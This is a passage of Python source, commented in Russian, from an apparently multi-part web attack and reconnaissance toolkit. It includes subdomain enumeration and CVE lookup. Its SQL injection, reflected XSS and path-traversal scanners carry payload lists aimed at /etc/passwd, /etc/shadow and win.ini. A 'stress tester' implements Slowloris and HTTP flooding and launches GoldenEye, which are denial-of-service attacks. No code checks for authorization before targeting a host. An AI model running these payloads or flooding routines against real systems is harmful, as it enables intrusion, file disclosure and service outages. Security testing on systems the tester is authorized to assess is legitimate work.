                    subs.add(line.lower())
            return sorted(subs)
        except Exception as e:
            self._add_error(f"Sublist3r: {e}")
            return []

    # ---------- amass ----------
    def _run_amass(self, domain: str) -> List[str]:
        """Запускает amass из RepoManager"""
        repo_path = self.repo_manager.get_repo_path("amass")
        if not repo_path:
            return []

        # amass — Go-бинарник, может быть уже скомпилирован
        amass_bin = None
        for candidate in ["amass", "cmd/amass/amass"]:
            p = repo_path / candidate
            if p.exists():
                amass_bin = p
                break

        if not amass_bin:
            # Пробуем системный amass
            if Utils.has_command("amass"):
                cmd = f"amass enum -passive -d {domain} -timeout 2"
            else:
                return []
        else:
            cmd = f'"{amass_bin}" enum -passive -d {domain} -timeout 2'

        try:
            ok, out, err = self.repo_manager._run_command(cmd, timeout=120)
            if not ok:
                return []

            subs = set()
            for line in out.splitlines():
                line = line.strip()
                if domain in line and " " not in line:
                    subs.add(line.lower())
            return sorted(subs)
        except Exception as e:
            self._add_error(f"amass: {e}")
            return []

    # ---------- subfinder ----------
    def _run_subfinder(self, domain: str) -> List[str]:
        """Запускает subfinder из RepoManager"""
        repo_path = self.repo_manager.get_repo_path("subfinder")
        if not repo_path:
            return []

        # subfinder — Go, ищем бинарник
        subfinder_bin = None
        for candidate in ["subfinder", "cmd/subfinder/subfinder"]:
            p = repo_path / candidate
            if p.exists():
                subfinder_bin = p
                break

        if not subfinder_bin:
            if Utils.has_command("subfinder"):
                cmd = f"subfinder -d {domain} -silent -timeout 10"
            else:
                return []
        else:
            cmd = f'"{subfinder_bin}" -d {domain} -silent -timeout 10'

        try:
            ok, out, err = self.repo_manager._run_command(cmd, timeout=120)
            if not ok:
                return []

            subs = set()
            for line in out.splitlines():
                line = line.strip()
                if domain in line and " " not in line:
                    subs.add(line.lower())
            return sorted(subs)
        except Exception as e:
            self._add_error(f"subfinder: {e}")
            return []

    # ---------- DNS-брутфорс ----------
    def _dns_bruteforce(self, domain: str) -> List[str]:
        """DNS-брутфорс по встроенному словарю"""
        if not HAS_DNS:
            return []

        subs = set()
        resolver = dns.resolver.Resolver()
        resolver.timeout = 2
        resolver.lifetime = 2

        def check(sub: str):
            if is_shutdown_requested():
                return
            full = f"{sub}.{domain}"
            try:
                resolver.resolve(full, "A", lifetime=2)
                subs.add(full)
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = [ex.submit(check, s) for s in self.COMMON_SUBDOMAINS]
            for _ in as_completed(futures):
                pass

        return sorted(subs)


# ==============================================================================
# КОНЕЦ PART 3
# ==============================================================================
# В следующей части (part4_vuln.py):
#   - class VulnBase
#   - class CVEScanner  (NVD API + offline fallback)
#   - class NiktoScanner (через RepoManager)
#   - class SQLiScanner
#   - class XSSScanner
#   - class LfiScanner
#   - class StressTester (Slowloris + HTTP-флуд + GoldenEye)
# ==============================================================================# ==============================================================================
# PART 4 — МОДУЛИ УЯЗВИМОСТЕЙ
# CVE, Nikto, SQLi, XSS, LFI, Стресс-тесты
# ==============================================================================
# Требует: part1_core.py, part2_repos.py, part3_analysis.py
# ==============================================================================

import os
import re
import sys
import json
import time
import socket
import ssl
import random
import string
import threading
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urlencode, urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False


# ==============================================================================
# БАЗА ДЛЯ ВСЕХ СКАНЕРОВ УЯЗВИМОСТЕЙ
# ==============================================================================
class VulnBase:
    """
    Базовый класс для сканеров уязвимостей
    Хранит результаты в едином формате
    """

    NAME = "vuln"
    DESCRIPTION = "Сканер уязвимостей"
    SEVERITIES = ("critical", "high", "medium", "low", "info")

    def __init__(self, logger: "Logger"):
        self.logger = logger
        self.results: Dict[str, Any] = {
            "vulnerabilities": [],
            "info": [],
            "errors": [],
            "duration": 0.0,
        }
        self._start_time: Optional[float] = None
        self._lock = threading.Lock()

    # ---------- Управление ----------
    def _start(self):
        self._start_time = time.time()

    def _stop(self):
        if self._start_time:
            self.results["duration"] = time.time() - self._start_time

    def reset(self):
        self.results = {
            "vulnerabilities": [],
            "info": [],
            "errors": [],
            "duration": 0.0,
        }

    # ---------- Добавление ----------
    def add_vuln(self, name: str, severity: str, description: str,
                 evidence: str = "", url: str = "", param: str = "",
                 cve: str = "", cvss: Optional[float] = None):
        """Добавляет найденную уязвимость"""
        severity = severity.lower()
        if severity not in self.SEVERITIES:
            severity = "info"

        with self._lock:
            self.results["vulnerabilities"].append({
                "name": name,
                "severity": severity,
                "description": description,
                "evidence": evidence,
                "url": url,
                "param": param,
                "cve": cve,
                "cvss": cvss,
                "scanner": self.NAME,
                "timestamp": datetime.now().isoformat(),
            })

    def add_info(self, message: str, **extra):
        """Добавляет информационное сообщение"""
        item = {
            "message": message,
            "scanner": self.NAME,
            "timestamp": datetime.now().isoformat(),
        }
        item.update(extra)
        with self._lock:
            self.results["info"].append(item)

    def add_error(self, message: str):
        """Добавляет ошибку"""
        with self._lock:
            self.results["errors"].append({
                "message": message,
                "scanner": self.NAME,
                "timestamp": datetime.now().isoformat(),
            })
        self.logger.debug(f"[{self.NAME}] {message}")

    # ---------- Итог ----------
    def finalize(self) -> Dict[str, Any]:
        """Возвращает результаты"""
        self._stop()
        return self.results

    def count(self) -> int:
        return len(self.results.get("vulnerabilities", []))

    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        """Переопределяется"""
        raise NotImplementedError


# ==============================================================================
# CVE SCANNER
# ==============================================================================
class CVEScanner(VulnBase):
    """
    Поиск CVE-уязвимостей
    - NVD API (онлайн)
    - Offline fallback по версиям
    """

    NAME = "cve"
    DESCRIPTION = "Поиск CVE"

    NVD_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"

    # Известные уязвимые версии (offline база)
    KNOWN_VULNS = {
        "nginx": {
            "1.18.0": [("CVE-2021-23017", "high", "DNS resolver off-by-one")],
            "1.16.0": [("CVE-2019-20372", "medium", "HTTP request smuggling")],
        },
        "apache": {
            "2.4.49": [("CVE-2021-41773", "critical", "Path traversal & RCE")],
            "2.4.50": [("CVE-2021-42013", "critical", "Path traversal bypass")],
            "2.4.51": [("CVE-2021-42013", "critical", "Path traversal bypass")],
        },
        "openssh": {
            "7.4": [("CVE-2018-15473", "medium", "Username enumeration")],
            "8.5": [("CVE-2021-41617", "medium", "Privilege escalation")],
        },
        "php": {
            "7.4.0": [("CVE-2019-11043", "critical", "FPM RCE via env")],
            "8.1.0": [("CVE-2024-4577", "critical", "CGI argument injection")],
        },
        "wordpress": {
            "5.0": [("CVE-2019-8942", "high", "RCE via crafted image")],
            "5.7": [("CVE-2021-29447", "high", "XXE in media library")],
        },
        "openssl": {
            "1.1.1": [("CVE-2022-0778", "high", "BN_mod_sqrt infinite loop")],
            "3.0.0": [("CVE-2022-0778", "high", "BN_mod_sqrt infinite loop")],
        },
        "iis": {
            "10.0": [("CVE-2021-31166", "critical", "HTTP.sys RCE")],
        },
    }

    def __init__(self, logger: "Logger", use_online: bool = True, timeout: int = 10):
        super().__init__(logger)
        self.use_online = use_online and HAS_REQUESTS
        self.timeout = timeout

    def scan(self, target: "Target",
             http_result: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Сканирует цель на CVE

        http_result — уже полученный результат HTTPAnalyzer (чтобы не делать повторно)
        """
        self._start()
        self.reset()

        # Определяем технологии
        technologies = self._extract_technologies(http_result)
        if not technologies:
            self.add_info("Не удалось определить технологии")
            return self.finalize()

        self.logger.info(f"  Найдено технологий: {len(technologies)}")

        for product, version in technologies.items():
            # Offline
            offline = self._check_offline(product, version)
            for cve_id, severity, desc in offline:
                self.add_vuln(
                    name=cve_id,
                    severity=severity,
                    description=desc,
                    evidence=f"{product} {version}",
                    cve=cve_id,
                )

            # Online (если есть)
            if self.use_online:
                online = self._check_online(product, version)
                for cve in online:
                    # Не дублируем
                    if not any(v["cve"] == cve["cve"] for v in self.results["vulnerabilities"]):
                        self.add_vuln(
                            name=cve["cve"],
                            severity=cve.get("severity", "info"),
                            description=cve.get("description", ""),
                            evidence=f"{product} {version}",
                            cve=cve["cve"],
                            cvss=cve.get("cvss"),
                        )

        return self.finalize()

    # ---------- Извлечение технологий ----------
    def _extract_technologies(self,
                               http_result: Optional[Dict[str, Any]]) -> Dict[str, str]:
        """Извлекает product → version из HTTP-результата"""
        versions: Dict[str, str] = {}

        if not http_result:
            return versions

        # Из Server
        server = http_result.get("server") or ""
        if server:
            parsed = self._parse_version_string(server)
            if parsed:
                versions.update(parsed)

        # Из технологий
        for tech in http_result.get("technologies", []):
            parsed = self._parse_version_string(tech)
            if parsed:
                versions.update(parsed)

        # Из headers
        headers = http_result.get("headers", {}) or {}
        for h in ("Server", "X-Powered-By", "X-Generator", "X-AspNet-Version"):
            if h in headers:
                parsed = self._parse_version_string(str(headers[h]))
                if parsed:
                    versions.update(parsed)

        return versions

    def _parse_version_string(self, s: str) -> Dict[str, str]:
        """Парсит 'nginx/1.18.0' → {'nginx': '1.18.0'}"""
        result = {}
        if not s:
            return result

        # Ищем pattern product/version
        for m in re.finditer(r'([A-Za-z][A-Za-z0-9_\-]+)[/\s]+(\d+\.\d+(?:\.\d+)?)', s):
            product = m.group(1).lower()
            version = m.group(2)
            result[product] = version

        return result

    # ---------- Offline ----------
    def _check_offline(self, product: str, version: str) -> List[Tuple[str, str, str]]:
        """Проверка по встроенной базе"""
        result = []
        product_lower = product.lower()

        for known_product, versions in self.KNOWN_VULNS.items():
            if known_product in product_lower or product_lower in known_product:
                for known_version, vulns in versions.items():
                    if version.startswith(known_version) or known_version.startswith(version):
                        result.extend(vulns)

        return result

    # ---------- Online (NVD API) ----------
    def _check_online(self, product: str, version: str) -> List[Dict[str, Any]]:
        """Проверка через NVD API"""
        if not self.use_online:
            return []

        results = []
        try:
            params = {
                "keywordSearch": f"{product} {version}",
                "resultsPerPage": 5,
            }
            r = requests.get(
                self.NVD_API,
                params=params,
                timeout=self.timeout,
                headers={"User-Agent": Utils.get_random_ua()}
            )

            if r.status_code != 200:
                self.add_error(f"NVD API: HTTP {r.status_code}")
                return []

            data = r.json()
            for item in data.get("vulnerabilities", [])[:5]:
                cve = item.get("cve", {})
                cve_id = cve.get("id", "")
                if not cve_id:
                    continue

                # Описание
                description = ""
                for d in cve.get("descriptions", []):
                    if d.get("lang") == "en":
                        description = d.get("value", "")
                        break

                # Severity
                severity = "info"
                cvss = None
                metrics = cve.get("metrics", {})

                for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                    if key in metrics and metrics[key]:
                        m = metrics[key][0]
                        cvss_data = m.get("cvssData", {})
                        if key == "cvssMetricV2":
                            severity = cvss_data.get("baseSeverity", "info").lower()
                            cvss = cvss_data.get("baseScore")
                        else:
                            severity = cvss_data.get("baseSeverity", "info").lower()
                            cvss = cvss_data.get("baseScore")
                        break

                results.append({
                    "cve": cve_id,
                    "severity": severity,
                    "description": Utils.truncate(description, 300),
                    "cvss": cvss,
                })
        except Exception as e:
            self.add_error(f"NVD: {e}")

        return results

    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        return self.scan(target, http_result=kwargs.get("http_result"))


# ==============================================================================
# NIKTO SCANNER
# ==============================================================================
class NiktoScanner(VulnBase):
    """
    Интеграция с Nikto (web server scanner)
    Использует RepoManager для запуска nikto.pl
    """

    NAME = "nikto"
    DESCRIPTION = "Nikto web server scanner"

    def __init__(self, logger: "Logger", repo_manager: "RepoManager",
                 timeout: int = 180):
        super().__init__(logger)
        self.repo_manager = repo_manager
        self.timeout = timeout

    def scan(self, target: "Target") -> Dict[str, Any]:
        """Запускает Nikto против цели"""
        self._start()
        self.reset()

        # Ищем Nikto
        nikto_path = self._find_nikto()
        if not nikto_path:
            self.add_info("Nikto не найден (запустите --init-repos)")
            return self.finalize()

        # Определяем URL
        url = target.base_url("https") if target.port in (443, None) else target.base_url("http")

        # Формируем команду
        output_file = Path(tempfile.gettempdir()) / f"nikto_{int(time.time())}.json"

        perl = Utils.which("perl") or "perl"
        cmd = (
            f'"{perl}" "{nikto_path}" '
            f'-h "{url}" '
            f'-Format json '
            f'-output "{output_file}" '
            f'-nointeractive '
            f'-maxtime 120s'
        )

        self.logger.info(f"  Запуск Nikto против {url}...")

        ok, out, err = self.repo_manager._run_command(
            cmd, cwd=nikto_path.parent, timeout=self.timeout
        )

        if output_file.exists():
            self._parse_nikto_json(output_file)
            try:
                output_file.unlink()
            except Exception:
                pass
        else:
            # Fallback: парсим stdout
            if out:
                self._parse_nikto_stdout(out)
            elif err:
                self.add_error(f"Nikto: {Utils.truncate(err, 200)}")

        return self.finalize()

    def _find_nikto(self) -> Optional[Path]:
        """Ищет nikto.pl в repos или системе"""
        # В repos
        repo_path = self.repo_manager.get_repo_path("nikto")
        if repo_path:
            for name in ("nikto.pl", "program/nikto.pl", "nikto"):
                p = repo_path / name
                if p.exists():
                    return p

        # Системный
        for path in ("/usr/bin/nikto", "/usr/local/bin/nikto", "/opt/nikto/nikto.pl"):
            if Path(path).exists():
                return Path(path)

        which = Utils.which("nikto")
        if which:
            return Path(which)

        return None

    def _parse_nikto_json(self, path: Path):
        """Парсит JSON-вывод Nikto"""
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                data = json.load(f)
        except Exception as e:
            self.add_error(f"JSON parse: {e}")
            return

        # Nikto JSON может быть dict или list
        items = data if isinstance(data, list) else [data]

        for item in items:
            # Формат: {"vulnerabilities": [{"id":..., "msg":..., "url":...}]}
            vulns = item.get("vulnerabilities", []) if isinstance(item, dict) else []
            for v in vulns:
                self.add_vuln(
                    name=v.get("id") or v.get("msg", "Nikto finding"),
                    severity="medium",
                    description=v.get("msg", ""),
                    evidence=v.get("url", ""),
                    url=v.get("url", ""),
                )

            # Host info
            host = item.get("host", {}) if isinstance(item, dict) else {}
            if host.get("server"):
                self.add_info(f"Server: {host['server']}")

    def _parse_nikto_stdout(self, out: str):
        """Парсит текстовый вывод Nikto"""
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("+ ") and not line.startswith("+ Target") and not line.startswith("+ Start"):
                self.add_vuln(
                    name="Nikto finding",
                    severity="medium",
                    description=line[2:200],
                )

    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        return self.scan(target)


# ==============================================================================
# SQLI SCANNER
# ==============================================================================
class SQLiScanner(VulnBase):
    """
    Тест на SQL-инъекции
    - Error-based
    - Boolean-based
    - Time-based (опционально)
    """

    NAME = "sqli"
    DESCRIPTION = "SQL-инъекции"

    # Payload'ы для error-based
    ERROR_PAYLOADS = [
        "'",
        "\"",
        "')",
        "\")",
        "' OR '1'='1",
        "1' OR '1'='1",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' OR 1=1--",
        "1' OR 1=1#",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
    ]

    # Ошибки СУБД
    SQL_ERRORS = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "microsoft ole db provider for odbc drivers",
        "microsoft ole db provider for sql server",
        "odbc sql server driver",
        "sqlserver jdbc driver",
        "mysql_fetch_array",
        "mysql_fetch_assoc",
        "mysql_num_rows",
        "pg_query",
        "pg_exec",
        "postgresql query failed",
        "sqlite3.operationalerror",
        "sqlite error",
        "ora-01756",
        "ora-00933",
        "oracle error",
        "syntax error",
        "sqlstate",
        "division by zero",
        "invalid query",
        "jdbc",
        "sqlexception",
    ]

    # Тестовые параметры
    TEST_PARAMS = ["id", "page", "cat", "category", "product", "item", "user", "q", "query", "search"]

    def __init__(self, logger: "Logger", timeout: int = 10, threads: int = 10):
        super().__init__(logger)
        self.timeout = timeout
        self.threads = threads

    def scan(self, target: "Target",
             http_result: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Тестирует цель на SQLi"""
        self._start()
        self.reset()

        if not HAS_REQUESTS:
            self.add_error("requests не установлен")
            return self.finalize()

        base_url = target.base_url()

        # 1. Тест URL-параметров из главной
        urls_to_test = [base_url + "/", base_url + "/?id=1", base_url + "/?page=1"]

        # 2. Формы со страницы
        if HAS_BS4:
            forms = self._find_forms(base_url)
            for form in forms[:5]:
                self._test_form(form)

        # 3. Простые URL-параметры
        for url in urls_to_test:
            for param in self.TEST_PARAMS:
                if is_shutdown_requested():
                    break
                self._test_param(url, param)

        return self.finalize()

    def _find_forms(self, base_url: str) -> List[Dict[str, Any]]:
        """Находит формы на странице"""
        forms = []
        try:
            r = requests.get(base_url, timeout=self.timeout,
                             headers={"User-Agent": Utils.get_random_ua()})
            soup = BeautifulSoup(r.text, "html.parser")

            for form in soup.find_all("form"):
                action = form.get("action") or base_url
                if not action.startswith("http"):
                    action = urljoin(base_url, action)

                method = (form.get("method") or "GET").upper()
                inputs = {}
                for inp in form.find_all(["input", "textarea"]):
                    name = inp.get("name")
                    if name:
                        inputs[name] = inp.get("value") or "test"

                if inputs:
                    forms.append({
                        "action": action,
                        "method": method,
                        "inputs": inputs,
                    })
        except Exception as e:
            self.add_error(f"forms: {e}")

        return forms

    def _test_form(self, form: Dict[str, Any]):
        """Тестирует форму на SQLi"""
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        for param_name in inputs.keys():
            for payload in self.ERROR_PAYLOADS[:6]:
                data = dict(inputs)
                data[param_name] = payload

                try:
                    if method == "POST":
                        r = requests.post(action, data=data, timeout=self.timeout,
                                          headers={"User-Agent": Utils.get_random_ua()})
                    else:
                        r = requests.get(action, params=data, timeout=self.timeout,
                                         headers={"User-Agent": Utils.get_random_ua()})

                    if self._looks_like_sqli(r.text):
                        self.add_vuln(
                            name="SQL Injection (form)",
                            severity="high",
                            description=f"Параметр '{param_name}' в форме уязвим к SQLi",
                            evidence=f"payload={payload}",
                            url=action,
                            param=param_name,
                        )
                        return
                except Exception:
                    pass

    def _test_param(self, url: str, param: str):
        """Тестирует URL-параметр"""
        for payload in self.ERROR_PAYLOADS[:8]:
            try:
                r = requests.get(
                    url,
                    params={param: payload},
                    timeout=self.timeout,
                    headers={"User-Agent": Utils.get_random_ua()},
                )
                if self._looks_like_sqli(r.text):
                    self.add_vuln(
                        name="SQL Injection (GET)",
                        severity="high",
                        description=f"Параметр '{param}' уязвим к SQLi",
                        evidence=f"payload={payload}",
                        url=r.url,
                        param=param,
                    )
                    return
            except Exception:
                pass

    def _looks_like_sqli(self, text: str) -> bool:
        """Ищет признаки SQL-ошибки"""
        if not text:
            return False
        t = text.lower()
        return any(err in t for err in self.SQL_ERRORS)

    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        return self.scan(target, http_result=kwargs.get("http_result"))


# ==============================================================================
# XSS SCANNER
# ==============================================================================
class XSSScanner(VulnBase):
    """
    Тест на XSS (reflected)
    """

    NAME = "xss"
    DESCRIPTION = "XSS-уязвимости"

    PAYLOADS = [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
    ]

    UNIQUE_MARKER = "CASCXSS"

    TEST_PARAMS = ["q", "s", "search", "query", "name", "id", "page", "keyword", "keyword", "callback", "redirect"]

    def __init__(self, logger: "Logger", timeout: int = 10):
        super().__init__(logger)
        self.timeout = timeout

    def scan(self, target: "Target") -> Dict[str, Any]:
        self._start()
        self.reset()

        if not HAS_REQUESTS:
            self.add_error("requests не установлен")
            return self.finalize()

        base_url = target.base_url()

        for payload in self.PAYLOADS:
            if is_shutdown_requested():
                break

            # Уникальный маркер для точной проверки
            marker = f"{self.UNIQUE_MARKER}{random.randint(1000, 9999)}"
            test_payload = payload.replace("alert(1)", f"alert('{marker}')")

            for param in self.TEST_PARAMS:
                try:
                    r = requests.get(
                        base_url + "/",
                        params={param: test_payload},
                        timeout=self.timeout,
                        headers={"User-Agent": Utils.get_random_ua()},
                    )

                    if self._is_reflected(r.text, test_payload, marker):
                        self.add_vuln(
                            name="XSS (Reflected)",
                            severity="high",
                            description=f"Параметр '{param}' отражает ввод без экранирования",
                            evidence=f"payload={payload}",
                            url=r.url,
                            param=param,
                        )
                        break
                except Exception:
                    pass

        return self.finalize()

    def _is_reflected(self, response: str, payload: str, marker: str) -> bool:
        """Проверяет, отразился ли payload"""
        if not response:
            return False

        # Прямое отражение
        if payload in response:
            return True

        # Уникальный маркер + теги
        if marker in response and "<script>" in response.lower():
            return True

        return False

    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        return self.scan(target)


# ==============================================================================
# LFI SCANNER
# ==============================================================================
class LfiScanner(VulnBase):
    """
    Тест на Local File Inclusion
    """

    NAME = "lfi"
    DESCRIPTION = "LFI-уязвимости"

    PAYLOADS = [
        "../../../../etc/passwd",
        "../../../../etc/passwd%00",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd",
        "../../../../etc/hosts",
        "../../../../etc/shadow",
        "../../../../windows/win.ini",
        "..\\..\\..\\..\\windows\\win.ini",
        "../../../../windows/system32/drivers/etc/hosts",
        "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd",
    ]

    # Признаки успешного LFI
    LFI_SIGNATURES = [
        "root:x:0:0:",
        "root:*:0:0:",
        "daemon:x:",
        "bin:x:",
        "nobody:x:",
        "[fonts]",
        "[extensions]",
        "for 16-bit app support",
        "localhost.localdomain",
        "# localhost is used",
    ]

    TEST_PARAMS = ["file", "page", "path", "view", "include", "template", "load", "document", "folder", "root", "pg"]

    def __init__(self, logger: "Logger", timeout: int = 10):
        super().__init__(logger)
        self.timeout = timeout

    def scan(self, target: "Target") -> Dict[str, Any]:
        self._start()
        self.reset()

        if not HAS_REQUESTS:
            self.add_error("requests не установлен")
            return self.finalize()

        base_url = target.base_url()

        for param in self.TEST_PARAMS:
            for payload in self.PAYLOADS:
                if is_shutdown_requested():
                    break

                try:
                    r = requests.get(
                        base_url + "/",
                        params={param: payload},
                        timeout=self.timeout,
                        headers={"User-Agent": Utils.get_random_ua()},
                    )

                    if self._looks_like_lfi(r.text):
                        self.add_vuln(
                            name="LFI (Local File Inclusion)",
                            severity="high",
                            description=f"Параметр '{param}' уязвим к LFI",
                            evidence=f"payload={payload}",
                            url=r.url,
                            param=param,
                        )
                        return self.finalize()
                except Exception:
                    pass

        return self.finalize()

    def _looks_like_lfi(self, text: str) -> bool:
        """Ищет признаки LFI в ответе"""
        if not text:
            return False
        t = text.lower()
        return any(sig.lower() in t for sig in self.LFI_SIGNATURES)

    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        return self.scan(target)


# ==============================================================================
# STRESS TESTER
# ==============================================================================
class StressTester(VulnBase):
    """
    Малые стресс-тесты для проверки устойчивости
    - Slowloris
    - HTTP-флуд
    - GoldenEye (через RepoManager)
    """

    NAME = "stress"
    DESCRIPTION = "Стресс-тесты"

    def __init__(self, logger: "Logger", repo_manager: Optional["RepoManager"] = None):
        super().__init__(logger)
        self.repo_manager = repo_manager
        self.results["slowloris"] = {}
        self.results["http_flood"] = {}
        self.results["goldeneye"] = {}

    # ---------- Slowloris ----------
    def slowloris_test(self, target: "Target",
                       connections: int = 50,
                       duration: int = 5) -> Dict[str, Any]:
        """Тест Slowloris (открываем много соединений и держим)"""
        self.logger.info(f"  Slowloris: {connections} соединений на {duration}s...")

        result = {
            "success": False,
            "connections": 0,
            "errors": 0,
            "duration": duration,
        }

        stop_event = threading.Event()
        host = target.hostname
        port = target.port or (443 if target.scheme == "https" else 80)
        is_https = port == 443

        lock = threading.Lock()

        def worker():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))

                if is_https:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)

                # Отправляем заголовки по частям
                headers = [
                    f"GET / HTTP/1.1\r\n",
                    f"Host: {host}\r\n",
                    "User-Agent: Mozilla/5.0\r\n",
                    "Accept: */*\r\n",
                    "Connection: keep-alive\r\n",
                    "Keep-Alive: timeout=999, max=1000\r\n",
                ]

                for h in headers:
                    if stop_event.is_set():
                        break
                    try:
                        s.send(h.encode())
                        time.sleep(0.5)
                    except Exception:
                        break

                # Держим соединение
                while not stop_event.is_set():
                    try:
                        s.send(b"X-Keep-Alive: 1\r\n")
                        time.sleep(2)
                    except Exception:
                        break

                s.close()

                with lock:
                    result["connections"] += 1
            except Exception:
                with lock:
                    result["errors"] += 1

        threads = []
        for _ in range(connections):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.05)

        time.sleep(duration)
        stop_event.set()

        for t in threads:
            t.join(timeout=2)

        result["success"] = result["connections"] > 0
        self.results["slowloris"] = result
        return result

    # ---------- HTTP-флуд ----------
    def http_flood_test(self, target: "Target",
                        requests_count: int = 100,
                        workers: int = 10) -> Dict[str, Any]:
        """HTTP-флуд (много запросов за короткое время)"""
        self.logger.info(f"  HTTP-флуд: {requests_count} запросов / {workers} воркеров...")

        result = {
            "success": False,
            "requests": 0,
            "errors": 0,
            "duration": 0.0,
        }

        if not HAS_REQUESTS:
            result["errors"] = 1
            return result

        url = target.base_url()
        lock = threading.Lock()
        start = time.time()

        def worker(n: int):
            session = requests.Session()
            session.headers.update({"User-Agent": Utils.get_random_ua()})
            for _ in range(n):
                if is_shutdown_requested():
                    return
                try:
                    session.get(url, timeout=3)
                    with lock:
                        result["requests"] += 1
                except Exception:
                    with lock:
                        result["errors"] += 1

        per_worker = max(1, requests_count // workers)
        threads = [
            threading.Thread(target=worker, args=(per_worker,), daemon=True)
            for _ in range(workers)
        ]

        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=60)

        result["duration"] = time.time() - start
        result["success"] = result["requests"] > 0
        self.results["http_flood"] = result
        return result

    # ---------- GoldenEye ----------
    def goldeneye_test(self, target: "Target", duration: int = 10) -> Dict[str, Any]:
        """Запуск GoldenEye из RepoManager (если есть)"""
        result = {"success": False, "output": "", "errors": []}

        if not self.repo_manager:
            result["errors"].append("RepoManager не передан")
            return result

        repo_path = self.repo_manager.get_repo_path("goldeneye")
        if not repo_path:
            result["errors"].append("GoldenEye не найден (--init-repos)")
            return result

        script = repo_path / "goldeneye.py"
        if not script.exists():
            result["errors"].append("goldeneye.py не найден")
            return result

        url = target.base_url("https")

        try:
            cmd = (
                f'"{sys.executable}" "{script}" '
                f'"{url}" -w 5 -s 10 -d 10'
            )
            ok, out, err = self.repo_manager._run_command(
                cmd, cwd=repo_path, timeout=duration + 30
            )
            result["success"] = ok
            result["output"] = Utils.truncate(out, 500)
            if err:
                result["errors"].append(Utils.truncate(err, 200))
        except Exception as e:
            result["errors"].append(str(e))

        self.results["goldeneye"] = result
        return result

    # ---------- Полный тест ----------
    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        """Запускает все стресс-тесты (малые)"""
        self._start()
        self.reset()

        self.slowloris_test(target, connections=20, duration=3)
        self.http_flood_test(target, requests_count=50, workers=5)

        if self.repo_manager and self.repo_manager.has_repo("goldeneye"):
            try:
                self.goldeneye_test(target, duration=5)
            except Exception as e:
                self.add_error(f"GoldenEye: {e}")

        return self.finalize()


# ==============================================================================
# КОНЕЦ PART 4
# ==============================================================================
# В следующей части (part5_integration.py):
#   - class CascAnalys  (главный класс, интеграция всех модулей)
#   - analyze_target()  (полный анализ)
#   - smart_analyze()   (авто-подбор модулей)
#   - run()             (обработка args из CLI)
# ==============================================================================# ==============================================================================
# PART 5 — ИНТЕГРАЦИЯ ЯДРА
# Главный класс CascAnalys, полный анализ, умный режим, запуск
# ==============================================================================
# Требует: part1_core.py, part2_repos.py, part3_analysis.py, part4_vuln.py
# ==============================================================================

import os
import sys
import json
import time
import threading
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed


# ==============================================================================
# ГЛАВНЫЙ КЛАСС CASC-ANAYS
# ==============================================================================
class CascAnalys:
    """
    Главный класс CASC-ANAYS с полной интеграцией модулей

    Компоненты:
        - Config          — конфигурация
        - Logger          — логирование
        - RepoManager     — 40 GitHub-репозиториев
        - PortScanner     — TCP/UDP
        - HTTPAnalyzer    — aiohttp + SSL + WAF
        - DNSAnalyzer     — A/AAAA/MX/NS/TXT
        - OSINTModule     — WHOIS
        - SubdomainModule — crt.sh + Sublist3r + amass + subfinder
        - CVEScanner      — NVD + offline
        - NiktoScanner    — через RepoManager
        - SQLiScanner     — error-based
        - XSSScanner      — reflected
        - LfiScanner      — path traversal
        - StressTester    — Slowloris + HTTP-флуд + GoldenEye
    """

    # Доступные модули анализа
    ALL_MODULES = ["ports", "http", "dns", "osint", "subdomains", "vuln", "stress"]

    # Приоритеты модулей для умного режима
    MODULE_WEIGHTS = {
        "ports": 1,
        "http": 2,
        "dns": 1,
        "osint": 2,
        "subdomains": 3,
        "vuln": 4,
        "stress": 5,
    }

    def __init__(self, config_path: str = "config.json",
                 base_dir: Optional[Path] = None):
        # Ядро
        self.config = Config(config_path)
        self.logger = Logger(
            log_file=self.config.get('settings.log_file'),
            level=self.config.get('settings.log_level', 'INFO')
        )
